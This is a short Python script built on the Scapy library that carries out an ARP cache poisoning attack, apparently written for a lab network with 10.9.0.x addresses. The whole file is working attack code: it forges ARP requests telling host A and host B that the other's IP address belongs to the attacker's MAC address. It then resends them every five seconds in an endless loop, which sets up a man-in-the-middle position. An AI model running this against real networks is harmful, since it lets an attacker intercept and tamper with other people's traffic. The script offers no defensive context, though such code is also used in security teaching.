
#!/usr/bin/python3
from scapy.all import *
from time import *
from scapy.layers.l2 import Ether, ARP

IP_A = "10.9.0.5"
MAC_A= "02:42:0a:09:00:05"

IP_B = "10.9.0.6"
MAC_B= "02:42:0a:09:00:06"

IP_M = "10.9.0.105"
MAC_M= "02:42:0a:09:00:69"

#Spoofed ARP Request to Host A
ether1 = Ether()
ether1.dst = 'ff:ff:ff:ff:ff:ff'
ether1.src = MAC_M

arp1 = ARP()
arp1.psrc = IP_B
arp1.hwsrc = MAC_M
arp1.pdst = IP_A
arp1.op = 1 #ARP Request
frame1 = ether1/arp1

#Spoofed ARP Request to Host B
ether2 = Ether()
ether2.dst = MAC_B
arp2 = ARP()
arp2.psrc = IP_A
arp2.hwsrc = MAC_M
arp2.pdst = IP_B
arp2.op = 1 #ARP Request
frame2 = ether2/arp2

while(1):
    # print("--Sending spoofed ARP request to both Host A and Host B")
    sendp(frame1)
    sendp(frame2)
    sleep(5)
